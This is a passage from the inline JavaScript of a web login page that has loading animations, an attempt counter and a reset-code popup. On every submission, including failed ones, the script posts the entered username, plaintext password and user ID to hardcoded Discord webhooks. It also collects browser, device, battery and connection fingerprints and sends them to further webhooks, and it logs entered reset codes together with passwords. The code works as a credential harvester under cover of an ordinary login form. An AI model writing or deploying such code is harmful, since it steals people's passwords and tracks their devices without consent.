        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHRJSANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordToggle = document.getElementById('showPasswordToggle');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 3; // Changed from 5 to 3
      let users = [];
      let loginTime = null;

      // Initial loading sequence
      document.addEventListener('DOMContentLoaded', () => {
        const initialLoadingScreen = document.getElementById('initialLoadingScreen');
        const initialLoadingText = document.getElementById('initialLoadingText');
        const loginWrapper = document.getElementById('loginWrapper');

        setTimeout(() => {
          initialLoadingText.textContent = 'Initializing System Complete!';
          initialLoadingText.classList.add('loading-complete-text');
          initialLoadingText.classList.remove('loading-text');

          setTimeout(() => {
            initialLoadingText.textContent = 'Initializing Login Page...';
            initialLoadingText.classList.add('loading-text');
            initialLoadingText.classList.remove('loading-complete-text');

            setTimeout(() => {
              initialLoadingScreen.style.opacity = 0;
              initialLoadingScreen.addEventListener('transitionend', () => {
                initialLoadingScreen.style.display = 'none';
                loginWrapper.style.display = 'flex';
                document.body.classList.add('login-body');
                dashboard.initClock(); // Start login clock
              });
            }, 2000); // Wait for "Initializing Login Page..." to show
          }, 1500); // Wait for "Complete" message
        }, 1500); // Initial "Initializing System.." duration
      });


      // Show/hide password toggle
      showPasswordToggle.addEventListener('change', (e) => {
        passwordInput.type = e.target.checked ? 'text' : 'password';
        activityLogger.addLog(`Show password toggled ${e.target.checked ? 'on' : 'off'}`);
        statsTracker.increment('togglesUsed');
      });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
        })
        .catch(() => {
          users = [];
          console.error('Failed to load user JSON data.');
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
          activityLogger.addLog(`Webhook to ${url.split('/')[5]} failed`);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
          // New logging fields (dummy data or actual if obtainable)
          ipAddress: "192.168.1.1", // Placeholder
          vpnDetected: Math.random() < 0.2 ? "Yes" : "No", // Dummy
          proxyDetected: Math.random() < 0.1 ? "Yes" : "No", // Dummy
          ipv6Address: "fe80::1ff:fe23:4567:890a%eth0", // Placeholder
          localIPs: ["192.168.1.100", "10.0.0.5"], // Placeholder
          pagesVisited: activityLogger.getLogs().filter(log => log.includes('Panel')).map(log => log.split('Panel "')[1]?.split('"')[0] || 'Unknown').slice(0, 5), // Placeholder
          actionsPerformed: activityLogger.getLogs().slice(0, 10), // Placeholder
          errorsEncountered: [], // Placeholder
          warnings: [], // Placeholder
          roleChanges: [], // Placeholder
          permissionChanges: [], // Placeholder
          lastActivityTime: new Date().toISOString(), // Placeholder
          numberOfClicks: statsTracker.buttonsPressed, // Placeholder
          numberOfFormSubmissions: 1, // Placeholder
          idleTime: "0s", // Placeholder
          activeTime: "Unknown", // Placeholder
          tabFocusTime: "Unknown" // Placeholder
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders (modified for new fields)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true },
            { name: "IP Address", value: data.ipAddress || "Unavailable", inline: true }, // New Field
            { name: "VPN Detected", value: data.vpnDetected || "Unknown", inline: true }, // New Field
            { name: "Proxy Detected", value: data.proxyDetected || "Unknown", inline: true } // New Field
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true }, // New field, often browser-related
            { name: "User OS", value: navigator.platform || "Unknown", inline: true } // New field, often browser-related
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Version", value: navigator.userAgent.match(/(chrome|firefox|safari|edge)\/([0-9\.]+)/i)?.[0] || "Unknown", inline: true } // New Field
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "IP Address", value: data.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.proxyDetected ? "Yes" : "No", inline: true },

            { name: "Public IPv6", value: data.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },

            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },

            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },

            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },

            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },

            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },

            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true },
            { name: "Input Device Type", value: "Keyboard/Mouse", inline: true }, // New Field
            { name: "Microphone Access", value: "Unavailable", inline: true }, // New Field
            { name: "Camera Access", value: "Unavailable", inline: true } // New Field
          ]
        };
      }


      // Handle login submission
      async function submitLogin() {
        statsTracker.increment('loginsAttempted');
        activityLogger.addLog('Login attempt initiated');

        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          activityLogger.addLog('Login failed: Missing fields');
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found or ID incorrect.');
          activityLogger.addLog(`Login failed: User "${username}" not found or ID "${userID}" incorrect`);
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          activityLogger.addLog(`Login failed: Incorrect password for "${username}"`);
          return;
        }

        // Correct login
        statsTracker.increment('successfulLogins');
        activityLogger.addLog(`Successful login for "${username}"`);
        
        attempts = 3;
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = '#555';
        loginBox.style.boxShadow = '0 0 10px rgba(255, 255, 255, 0.2)';

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);
        
        // Save last login history
        dashboard.saveLoginHistory(user.name || user.username, userID);

        // Show dashboard loading screen
        document.getElementById('loginWrapper').style.display = 'none';
        const dashboardLoadingScreen = document.getElementById('dashboardLoadingScreen');
        const dashboardLoadingText = document.getElementById('dashboardLoadingText');
        const codeAnimation = document.getElementById('codeAnimation');
        
        dashboardLoadingScreen.style.display = 'flex';
        dashboardLoadingScreen.style.opacity = 1;
        dashboardLoadingText.textContent = 'Loading Dashboard..';
        dashboardLoadingText.classList.add('loading-text');
        dashboardLoadingText.classList.remove('loading-complete-text');

        const codeSnippets = [
          "Parsing user data...",
          "Establishing secure connection...",
          "Compiling modules...",
          "Authenticating services...",
          "Retrieving dashboard layout...",
          "Applying user preferences...",
          "Finalizing session handshake...",
          "Loading complete."
        ];
        let snippetIndex = 0;

        const animateCode = setInterval(() => {
          if (snippetIndex < codeSnippets.length) {
            codeAnimation.textContent = codeSnippets[snippetIndex];
            snippetIndex++;
          } else {
            clearInterval(animateCode);
            // Transition to dashboard after code animation
            setTimeout(() => {
                dashboardLoadingScreen.style.opacity = 0;
                dashboardLoadingScreen.addEventListener('transitionend', () => {
                    dashboardLoadingScreen.style.display = 'none';
                    document.getElementById('dashboard').style.display = 'flex';
                    document.body.className = 'dashboard-body';
                    
                    // Update user info in dashboard
                    document.getElementById('loggedInUser').textContent = user.name || user.username;
                    document.getElementById('loggedInID').textContent = userID;
                    
                    // Initialize dashboard functionality
                    dashboard.init();
                    dashboard.showWelcomeNotification(user.name || user.username);
                }, { once: true });
            }, 1000); // Small delay after last snippet
          }
        }, 800); // Speed of code animation
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        activityLogger.addLog(`Login attempt failed. Attempts left: ${attempts}`);
        
        if (attempts <= 0) {
          attempts = 0;
          updateAttemptsText(); // Ensure it shows 0
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          activityLogger.addLog('Max login attempts exceeded');
          
          showResetPopup();
          disableInputs();
        } else {
          if (attempts <= 2) { // Changed from 3 to 2 for visual feedback with 3 total attempts
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
        activityLogger.addLog('Login inputs disabled');
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
        activityLogger.addLog('Login inputs enabled');
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
        activityLogger.addLog('Reset popup displayed');
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
        activityLogger.addLog('Reset popup hidden');
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "🔔 Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);
        activityLogger.addLog(`Reset attempt with code "${enteredCode}". Result: ${isCorrect ? 'Success' : 'Failure'}`);
        statsTracker.increment('buttonsPressed');

        if (isCorrect) {
          attempts = 3;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
        } else {
          alert('Incorrect reset code.');
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();
    })();
  </script>
</body>
</html>
